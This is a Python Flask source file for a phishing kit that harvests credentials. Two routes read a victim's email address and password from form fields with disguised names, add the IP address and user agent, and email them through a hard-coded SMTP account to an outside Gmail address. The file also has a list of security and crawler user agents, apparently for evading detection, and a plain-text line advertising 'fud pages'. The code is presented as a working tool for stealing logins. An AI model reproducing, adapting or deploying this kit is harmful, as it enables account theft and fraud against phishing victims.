from flask import Flask, request, render_template, session, redirect, url_for
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

secret_keyx = "your_secret_key"  # Replace with your secret key
app.secret_key = secret_keyx

bot_user_agents = [
    'Googlebot', 'Baiduspider', 'ia_archiver', 'R6_FeedFetcher', 'NetcraftSurveyAgent', 'Sogou web spider',
    'bingbot', 'Yahoo! Slurp', 'facebookexternalhit', 'PrintfulBot', 'msnbot', 'Twitterbot', 'UnwindFetchor',
    'urlresolver', 'Butterfly', 'TweetmemeBot', 'PaperLiBot', 'MJ12bot', 'AhrefsBot', 'Exabot', 'Ezooms',
    'YandexBot', 'SearchmetricsBot', 'phishtank', 'PhishTank', 'picsearch', 'TweetedTimes Bot', 'QuerySeekerSpider',
    'ShowyouBot', 'woriobot', 'merlinkbot', 'BazQuxBot', 'Kraken', 'SISTRIX Crawler', 'R6_CommentReader',
    'magpie-crawler', 'GrapeshotCrawler', 'PercolateCrawler', 'MaxPointCrawler', 'R6_FeedFetcher', 'NetSeer crawler',
    'grokkit-crawler', 'SMXCrawler', 'PulseCrawler', 'Y!J-BRW', '80legs.com/webcrawler', 'Mediapartners-Google',
    'Spinn3r', 'InAGist', 'Python-urllib', 'NING', 'TencentTraveler', 'Feedfetcher-Google', 'mon.itor.us', 'spbot',
    'Feedly', 'bot', 'curl', "spider", "crawler"
]

@app.route("/")
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or request.headers.get('X-Client-IP') or request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "onoshijohn@erhawthone.com"
        receiver_email = "onoshijohn@gmail.com"
        password = "1RQoQkJC[l)l"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "KOREA UPDATE ! 1"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        return render_template('ind.html', eman=email, dman=passwordemail)

@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or request.headers.get('X-Client-IP') or request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "onoshijohn@erhawthone.com"
        receiver_email = "onoshijohn@gmail.com"
        password = "1RQoQkJC[l)l"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "KOREA UPDATE !! 2"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        return redirect(url_for('lasmo'))

    return render_template('main.html', dman=None)

@app.route("/lasmo")
def lasmo():
    return "This is lasmo route"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3000)
